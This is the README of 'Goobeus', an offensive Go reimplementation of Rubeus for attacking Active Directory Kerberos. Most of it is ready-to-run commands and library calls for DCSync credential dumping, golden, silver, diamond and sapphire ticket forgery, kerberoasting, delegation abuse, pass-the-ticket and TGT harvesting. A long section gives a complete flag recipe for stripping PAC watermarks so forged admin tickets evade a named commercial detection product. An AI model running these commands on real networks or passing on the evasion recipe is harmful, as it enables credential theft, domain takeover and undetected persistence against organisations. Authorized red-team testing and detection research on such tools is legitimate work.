# Goobeus

![Goobeus](goobeus.jpg)

A comprehensive Go implementation of [Rubeus](https://github.com/GhostPack/Rubeus) for Kerberos manipulation, designed for both Windows and Linux.

> **Educational Focus**: Every function includes detailed documentation explaining the underlying Kerberos concepts, RFC references, and security implications. This tool is designed to teach Kerberos while providing red team capabilities.

## Features

| Category | Commands | Description |
|----------|----------|-------------|
| **TGT Operations** | `asktgt` | Request TGT with password, NTLM hash, or AES keys |
| **Service Tickets** | `asktgs` | Request TGS for specific SPNs |
| **Delegation** | `s4u`, `rbcd`, `constrained` | S4U2Self/S4U2Proxy, Resource-Based Constrained Delegation |
| **Ticket Management** | `describe`, `ptt`, `dump`, `triage`, `klist`, `purge`, `tgtdeleg`, `monitor`, `harvest` | View, import, export, and manage Kerberos tickets |
| **Forgery** | `golden`, `silver`, `diamond`, `sapphire` | Forge tickets with various techniques |
| **Roasting** | `kerberoast`, `asreproast` | Extract crackable hashes |
| **Credential Extraction** | `dcsync` | DCSync attack via MS-DRSR replication |
| **ADWS Enumeration** | `enumerate` | Active Directory Web Services enumeration |
| **Utilities** | `hash`, `changepw`, `createnetonly`, `currentluid` | Password hashing, Kerberos password change, and session utilities |

## Quick Start

### Build

```bash
# Build for Windows
GOOS=windows GOARCH=amd64 go build -o goobeus.exe ./cmd/goobeus

# Build for Linux  
go build -o goobeus ./cmd/goobeus
```

### Global Flags

```
-d, --domain    Domain name
-u, --user      Username
-p, --pass      Password
-r, --rc4       NT hash (RC4)
-a, --aes       AES256 key
-t, --ticket    Ticket file or base64
-k, --kdc       KDC address
-o, --out       Output file
-f, --format    Output format (kirbi, ccache, base64)
-v, --verbose   Verbose output
```

## Command Reference

### TGT Operations

```bash
# Request TGT with password
goobeus -d corp.local -u jsmith -p 'Password123!' asktgt

# Request TGT with NTLM hash (overpass-the-hash)
goobeus -d corp.local -u jsmith -r aad3b435b51404eeaad3b435b51404ee asktgt

# Request TGT with AES256 key
goobeus -d corp.local -u jsmith -a <aes256_key> asktgt

# Export as .ccache (for Linux tools like Impacket)
goobeus -d corp.local -u jsmith -p 'Password!' -o jsmith.ccache asktgt

# Export as .kirbi (for Windows tools)
goobeus -d corp.local -u jsmith -p 'Password!' -o jsmith.kirbi asktgt
```

### DCSync

Extract credentials from a Domain Controller using the MS-DRSR replication protocol.

**Required Privileges**: `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`  
**Default Holders**: Domain Admins, Enterprise Admins, Domain Controllers

```bash
# DCSync single user (extract krbtgt for Golden Ticket attacks)
goobeus -d corp.local -u admin -p 'Password!' dcsync --user krbtgt --dc dc01.corp.local

# DCSync ALL domain users (like secretsdump.py)
goobeus -d corp.local -u admin -p 'Password!' dcsync --all --dc dc01.corp.local

# Use NT hash for authentication
goobeus -d corp.local -u admin -r <nt_hash> dcsync --user krbtgt --dc dc01.corp.local
```

**DCSync Flags:**

- `--user <username>` - Target user to extract (e.g., krbtgt, Administrator)
- `--dc <hostname>` - Domain Controller hostname/IP
- `--all` - Dump all domain users (like secretsdump -just-dc)

> **Output**: Returns NT hash, AES256, and AES128 keys for extracted users. The AES256 key from krbtgt is perfect for Diamond/Sapphire ticket forging!

### Ticket Forgery

```bash
# Forge Golden Ticket
goobeus -d corp.local golden --sid S-1-5-21-... --krbtgt <hash> --user fakeadmin

# Forge Silver Ticket
goobeus -d corp.local silver --sid S-1-5-21-... --hash <svc_key> \
  --spn cifs/fileserver.corp.local --user admin

# Forge Diamond Ticket (inflate your own PAC with extra group RIDs)
goobeus -d corp.local -u lowpriv -p 'Password!' diamond \
  --krbtgt <krbtgt_aes256> --sid S-1-5-21-... --groups 512,519,520

# Forge Sapphire Ticket (real PAC via S4U2Self+U2U)
goobeus -d corp.local -u lowpriv -p 'LowPrivPass!' sapphire \
  --aeskey <krbtgt_aes256> --nthash <krbtgt_nthash> \
  --impersonate Administrator -o admin.ccache

# Forge Sapphire Ticket with PAC byte-for-byte matching an MIT kinit AS-REQ TGT
#   (every PAC buffer size and offset identical to a legit kinit-issued TGT;
#    see docs/FIP_TESTING.md for the head-to-head diff)
goobeus -d corp.local -u lowpriv -p 'LowPrivPass!' sapphire \
  --aeskey <krbtgt_aes256> --nthash <krbtgt_nthash> \
  --impersonate Administrator \
  --strip-logon-flags \
  --strip-extra-groups --clear-extra-sids \
  --strip-full-checksum --strip-ticket-checksum \
  --sync-client-info-time --strip-proxiable --kinit-renew-till \
  -o admin.ccache
```

> **Sapphire Tickets**: The most advanced ticket forgery technique. Uses S4U2Self with User-to-User authentication to obtain a real PAC from the target user, then transplants it into a forged TGT. The resulting ticket contains genuine group memberships from Active Directory, making it harder to detect than Golden/Diamond tickets.
>
> Goobeus's sapphire implementation goes further than impacket's `ticketer.py -impersonate` on several fingerprintable axes:
> - Forged TGT inherits the **actual domain renew/lifetime policy** from the bootstrap AS-REP (vs ticketer's hardcoded `+24h` renew-till)
> - `crealm` is emitted UPPERCASE matching real Windows KDCs (ticketer ships lowercase — a published impacket signature)
> - `transited.tr-type=0` matches what KDCs emit on AS-REP TGTs (ticketer leaves it `=1`, inherited from the stolen TGS context)
> - PAC `SERVER_CHECKSUM`/`PRIVSVR_CHECKSUM` stay in their KDC-emitted positions immediately after `LOGON_INFO` (ticketer reorders them to the end)
> - Sapphire `sname` uses `NT_SRV_INST` for `krbtgt` like a real KDC (ticketer hardcodes `NT_PRINCIPAL`)
> - PA-FOR-USER `userRealm` is uppercased to match real Windows clients
>
> Both `--aeskey` (krbtgt AES256) and `--nthash` (krbtgt RC4) are accepted; provide both when available so PAC re-signing preserves whatever checksum types the original PAC used (avoids a "checksum type changed" detection).
>
> #### PAC watermark stripping, structural normalization, and consistency sync
>
> When the KDC issues a service ticket via S4U2Self, it stamps several independent watermarks and stale-after-transplant checksums into the PAC that identify it as an impersonation artifact. A sapphire-forged TGT inherits all of them because it reuses the victim's real PAC. Each is structurally impossible for a legitimate AS-REQ-issued TGT, so any detection with access to the `krbtgt` key can decrypt the ticket and flag them — regardless of how clean the wire-level Kerberos fields look.
>
> Empirical testing against CrowdStrike Falcon Identity Protection has confirmed OR-logic detection across multiple PAC-content indicators: any single indicator present triggers the alert. See [docs/FIP_TESTING.md](docs/FIP_TESTING.md) for the full test matrix, latency analysis, and account-level behavioral escalation findings.
>
> **PAC-content watermark strips :**
>
> - `--clear-extra-sids` — proper NDR-level removal of the `ExtraSids` array (`SidCount=0`, pointer=NULL, deferred bytes stripped, LOGON_INFO shrunk, subsequent PAC offsets rewritten). Matches legit MIT kinit AS-REQ TGT baseline exactly (empty ExtraSids). Without this the PAC carries `S-1-18-2` (`SERVICE_ASSERTED_IDENTITY`), the KDC's explicit S4U2Self marker.
> - `--strip-logon-flags` — clears the `LOGON_RESOURCE_GROUPS (0x200)` bit from `KERB_VALIDATION_INFO.UserFlags`. This bit is set by the KDC on S4U2Self responses and never appears on normal AS-REQ TGTs. Scoped to the `LOGON_INFO` buffer only to avoid false-positive matches elsewhere in the PAC.
> - `--strip-extra-groups` — NDR-level removal of the `RID 572` (Denied RODC Password Replication Group) entry from LOGON_INFO. On S4U2Self this entry is stamped into `ResourceGroupIds` with `attrs=0x20000007` (`SE_GROUP_RESOURCE` bit set) — a marker never present on an AS-REQ TGT where `ResourceGroupIds` is empty. The remover handles both `GroupIds` (attrs=0x7) and `ResourceGroupIds` (attrs=0x20000007) placements, shrinks LOGON_INFO by 12 bytes when the array becomes empty (MaxCount+entry), and rewrites all subsequent PAC buffer offsets.
> - `--strip-full-checksum` — removes the `PAC_FULL_CHECKSUM` buffer (type 19). Added in KB5020805 (November 2022) as an explicit anti-sapphire measure: an extended KDC-keyed HMAC over the entire PAC, designed to fail validation after PAC transplantation. On patched DCs the buffer is present and carries a checksum valid only for the original S4U2Self ticket; removing it entirely bypasses validation since the rule fails open on absence.
>
> **Stale-checksum strip (functionally tested; likely load-bearing, verification pending):**
>
> - `--strip-ticket-checksum` — removes the `PAC_TICKET_CHECKSUM` buffer (type 16). Added in KB5008380 (July 2021) as a keyed HMAC over the entire `EncTicketPart` encoding, designed to prevent PAC transplantation between tickets (exactly what sapphire does). Inherited stale from the S4U2Self ticket; invalid in the forged TGT. **WARNING**: DCs in strict KB5008380 enforcement mode may reject tickets lacking this buffer. Functionally tested safe on DCs that accept legacy clients; failure mode is auth error at ticket use, not at forge.
>
> **Structural consistency (defensive; reduces secondary-IOC surface):**
>
> - `--sync-client-info-time` — rewrites `CLIENT_INFO.ClientId` (a FILETIME at the start of the CLIENT_INFO buffer per MS-PAC 2.7) to match the forged TGT's `AuthTime`. Legitimate TGTs have these equal; sapphire inherits the S4U2Self issuance time which is seconds off from the attacker's AS-REP AuthTime. A consistency-check detection comparing these values would flag the mismatch.
> - `--strip-proxiable` — clears the `PROXIABLE` bit in `EncTicketPart.Flags`. Real Windows KDCs do not set this bit on AS-REP TGTs for protected / privileged accounts (Domain Admins, Protected Users). Leaving it set when forging a ticket for an admin user is a one-bit divergence from any legit TGT for that principal.
> - `--kinit-renew-till` — forces `RenewTill = AuthTime + 7 days` on the forged TGT. Matches MIT `kinit`'s default renew window. Without this flag the forged TGT inherits the attacker's AS-REP renew-till (typically `+24h`), producing a shorter-than-policy window that is itself anomalous for a domain-admin TGT.
>
> **Not for kinit parity:**
>
> - `--strip-pac-attributes` — rewrites `PAC_ATTRIBUTES_INFO.Flags` from `0x2` (`PAC_WAS_GIVEN_IMPLICITLY`, the KDC's signal that it issued the PAC without an explicit client request) to `0x1` (`PAC_WAS_REQUESTED`, matching what a Windows client gets when it sends `pA-PAC-REQUEST` on a normal AS-REQ). **However**, empirical comparison with a real MIT kinit AS-REQ TGT shows kinit PACs carry `Flags=0x2`, not `0x1` — kinit does not send `pA-PAC-REQUEST`, so the KDC emits it implicitly. Applying this flag therefore matches *Windows-client* AS-REQ parity and actively diverges from *MIT kinit* AS-REQ parity. Pick one target — don't apply this flag when modeling a Linux/MIT environment.
>
> *(A previous `--normalize-buffer-order` flag was removed — empirical testing against a real MIT kinit AS-REQ TGT showed that goobeus's default buffer order already matches the KDC-native AS-REQ TGT layout. The "canonical" order the flag produced was derived from an S4U2Self service ticket and did not match any observed legitimate TGT.)*
>
> **Use the full recipe.** Skipping any of the content strips leaves that indicator active. The consistency-sync flags are defensive — removing secondary IOCs that FIP may not currently check but which make the ticket indistinguishable from a legitimate KDC-issued TGT at the PAC level.
>
> Verify with `goobeus describe -t <ticket> -k <krbtgt_aes256>`. Against a real MIT kinit TGT for the same principal you should see **every** PAC buffer size and offset match byte-for-byte: `LOGON_INFO` size 472, `SERVER_CHECKSUM` at 592, `KDC_CHECKSUM` at 608, `CLIENT_INFO` at 624, `UPN_DNS_INFO` at 648, `ATTRIBUTES_INFO` at 816, `REQUESTOR_SID` at 824 (the exact numbers vary with the domain/user length, but the layout is identical between forged and legit). Buffer types `16` (`PAC_TICKET_CHECKSUM`) and `19` (`PAC_FULL_CHECKSUM`) must be absent; `USER FLAGS` must be `0x20`; `PAC_ATTRIBUTES_INFO Flags` must be `0x2` (kinit parity) or `0x1` (Windows parity — pick one); `EXTRA SIDS` must be empty; `GROUP SIDS` must not contain `RID 572`; and the final line must read `S4U2Self WATERMARK STATUS: ✓ Clean`.
>

### Roasting Attacks

```bash
# Kerberoast - extract TGS hashes for offline cracking
goobeus -d corp.local -u user -p 'Password!' kerberoast --dc dc01.corp.local

# Kerberoast specific SPN
goobeus kerberoast --spn MSSQLSvc/sql01.corp.local:1433

# AS-REP Roast users without pre-authentication
goobeus asreproast --domain corp.local --dc dc01.corp.local --users users.txt
```

### Delegation Attacks

```bash
# S4U2Self + S4U2Proxy constrained delegation
# Args are positional: <targetUser> [<targetSPN>]
goobeus -d corp.local -u svc_sql -r <hash> s4u administrator cifs/dc01.corp.local

# Resource-Based Constrained Delegation (RBCD) attack
goobeus -d corp.local -t machine.kirbi rbcd --action attack \
  --spn cifs/target.corp.local --impersonate Administrator

# Configure RBCD (add SID to msDS-AllowedToActOnBehalfOfOtherIdentity)
goobeus -d corp.local rbcd --action write --target CN=TARGET,... --sid S-1-5-21-...

# Standard constrained delegation attack
goobeus -d corp.local -t svc_account.kirbi constrained \
  --impersonate administrator --spn cifs/target.corp.local

# Use alternative service class
goobeus constrained --spn http/target.corp.local --altservice ldap ...
```

**RBCD Flags:**

- `--action <read|write|attack|clear>` - Action to perform (default: read)
- `--target <DN>` - Target computer distinguished name
- `--sid <SID>` - Machine account SID to add
- `--impersonate <user>` - User to impersonate (default: Administrator)
- `--spn <SPN>` - Target SPN for attack action

**Constrained Delegation Flags:**

- `--impersonate <user>` - User to impersonate (default: Administrator)
- `--spn <SPN>` - Target SPN from msDS-AllowedToDelegateTo
- `--altservice <service>` - Alternative service class (e.g., ldap, http)

### ADWS Enumeration

Enumerate Active Directory via ADWS (port 9389) - no LDAP required:

```bash
# List available enumeration modes
goobeus enumerate

# BloodHound-compatible JSON collection
goobeus -d corp.local enumerate bloodhound

# Enumerate users with SPNs (Kerberoast targets)
goobeus -d corp.local enumerate spn

# Enumerate AS-REP roastable users
goobeus -d corp.local enumerate asrep

# Enumerate delegation configurations
goobeus -d corp.local enumerate delegation

# Enumerate LAPS passwords
goobeus -d corp.local enumerate laps

# Enumerate gMSA accounts
goobeus -d corp.local enumerate gmsa

# Enumerate privileged groups (Domain Admins, Enterprise Admins, etc.)
goobeus -d corp.local enumerate groups

# Enumerate computers (with OS breakdown)
goobeus -d corp.local enumerate computers
```

**Enumeration Modes:**

| Mode | Description |
|------|-------------|
| `bloodhound` | BloodHound collection (ZIP with JSON) |
| `spn` | Kerberoastable accounts |
| `asrep` | AS-REP roastable accounts |
| `delegation` | Delegation configurations (unconstrained, constrained, RBCD) |
| `laps` | LAPS passwords (if readable) |
| `gmsa` | gMSA accounts |
| `groups` | Privileged group members |
| `computers` | All computers with OS statistics |

### Ticket Management

```bash
# Describe ticket contents
goobeus describe --ticket admin.kirbi
goobeus describe --ticket admin.ccache

# Convert between formats
goobeus describe --ticket admin.kirbi --out admin.ccache

# Hash password to Kerberos keys (password via -p, or as a positional arg)
goobeus -p 'Password123!' hash --domain corp.local --user jsmith
# Or:
goobeus hash --domain corp.local --user jsmith 'Password123!'

# Change password via kpasswd
goobeus -d corp.local -u jsmith -p 'OldPass!' changepw --new 'NewPass123!'
```

### Windows-Specific Commands

These commands interact with the Windows Kerberos credential cache and require running on Windows:

```bash
# Pass-the-ticket (inject into current session)
goobeus.exe ptt --ticket admin.kirbi

# Dump tickets from current session
goobeus.exe dump

# Dump all tickets (requires elevation)
goobeus.exe dump --all

# Triage/list cached tickets (aliases for dump)
goobeus.exe triage
goobeus.exe klist

# Purge tickets from cache
goobeus.exe purge

# Extract TGT via delegation trick
goobeus.exe tgtdeleg --spn cifs/dc01.corp.local

# Monitor for new TGTs
goobeus.exe monitor --interval 30s

# Harvest new TGTs automatically
goobeus.exe harvest --interval 30s

# Get current logon session LUID
goobeus.exe currentluid

# Create process with network-only credentials
goobeus.exe createnetonly --program cmd.exe --domain corp.local \
  --user admin --password "Pass123!"
```

## Library Usage

Goobeus is designed as a library first. You can import individual packages:

```go
import (
    "github.com/goobeus/goobeus/pkg/client"
    "github.com/goobeus/goobeus/pkg/ticket"
    "github.com/goobeus/goobeus/pkg/forge"
    "github.com/goobeus/goobeus/pkg/dcsync"
)

// Request a TGT
result, err := client.AskTGT(&client.TGTRequest{
    Domain:   "corp.local",
    Username: "jsmith",
    Password: "Password123!",
})

// Save as .kirbi
ticket.SaveKirbi(result.Kirbi, "jsmith.kirbi")

// Or convert to .ccache for Linux tools
ticket.SaveCCache(result.Kirbi, "jsmith.ccache")

// Forge a Sapphire Ticket
sapphireResult, err := forge.ForgeSapphireTicket(ctx, &forge.SapphireTicketRequest{
    Domain:       "corp.local",
    DomainSID:    "S-1-5-21-...",
    Username:     "lowpriv",
    Password:     "LowPrivPass!",
    Impersonate:  "Administrator",
    KrbtgtAES256: krbtgtKey,
    KDC:          "dc01.corp.local",
})

// DCSync to extract credentials
dcResult, err := dcsync.DCSync(ctx, &dcsync.DCSyncRequest{
    DC:         "dc01.corp.local",
    Domain:     "corp.local",
    Username:   "admin",
    Password:   "Password!",
    TargetUser: "krbtgt",
})
// dcResult.NTHash, dcResult.AES256, dcResult.AES128
```

## Ticket Formats

| Format | Extension | Use Case |
|--------|-----------|----------|
| kirbi | `.kirbi` | Windows tools (Mimikatz, Rubeus) |
| ccache | `.ccache` | Linux tools (Impacket, krb5) |
| base64 | - | Command-line passing, embedding |

Both formats are fully supported for input and output. Output format is auto-detected from file extension.

## Credential Input Formats

| Format | Flag | Example |
|--------|------|---------|
| Password | `-p, --pass` | `-p "Password123!"` |
| NTLM Hash | `-r, --rc4` | `-r aad3b435b51404eeaad3b435b51404ee` |
| AES Key | `-a, --aes` | `-a <hex>` (length determines AES128 vs AES256) |
| Ticket File | `-t, --ticket` | `-t admin.kirbi` |

## Hash Output Formats

Roasting commands support multiple output formats:

```bash
# Hashcat format (default)
goobeus kerberoast --format hashcat

# John the Ripper format
goobeus kerberoast --format john
```

Hashcat modes:

- `13100` - Kerberoast RC4
- `19600` - Kerberoast AES128  
- `19700` - Kerberoast AES256
- `18200` - AS-REP Roast

## Documentation

See the [docs/](docs/) directory for in-depth educational content:

- [KERBEROS_101.md](docs/KERBEROS_101.md) - Kerberos fundamentals
- [ENCRYPTION.md](docs/ENCRYPTION.md) - Encryption types deep dive
- [TICKETS.md](docs/TICKETS.md) - Ticket structure and formats
- [ATTACKS.md](docs/ATTACKS.md) - Attack techniques explained
- [DELEGATION.md](docs/DELEGATION.md) - Delegation abuse
- [DCSYNC.md](docs/DCSYNC.md) - DCSync attack internals
- [SAPPHIRE.md](docs/SAPPHIRE.md) - Sapphire ticket deep dive (implementation details, protocol flows, debugging)
- [TGTDELEG_IMPLEMENTATION.md](docs/TGTDELEG_IMPLEMENTATION.md) - TGT delegation implementation

## Package Structure

```
pkg/
├── adws/       # ADWS enumeration (port 9389)
├── asn1krb5/   # ASN.1 Kerberos message structures
├── client/     # Kerberos protocol client (AS-REQ, TGS-REQ, etc.)
├── crypto/     # Kerberos encryption (RC4, AES128, AES256)
├── dcsync/     # DCSync via MS-DRSR replication
├── delegation/ # S4U2Self, S4U2Proxy, RBCD
├── forge/      # Golden, Silver, Diamond, Sapphire tickets
├── pac/        # PAC parsing and creation
├── roast/      # Kerberoast, AS-REP roast
├── ticket/     # .kirbi and .ccache handling
└── windows/    # Windows-specific APIs (LSA, SSPI)
```

## Credits

- [Rubeus](https://github.com/GhostPack/Rubeus) by @harmj0y - Original C# implementation
- [gokrb5](https://github.com/jcmturner/gokrb5) - Go Kerberos library (reference)
- [Impacket](https://github.com/fortra/impacket) - Python Kerberos tools (reference)
- Charlie Clark's research on Diamond and Sapphire tickets

## Legal

This tool is intended for authorized security testing and research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
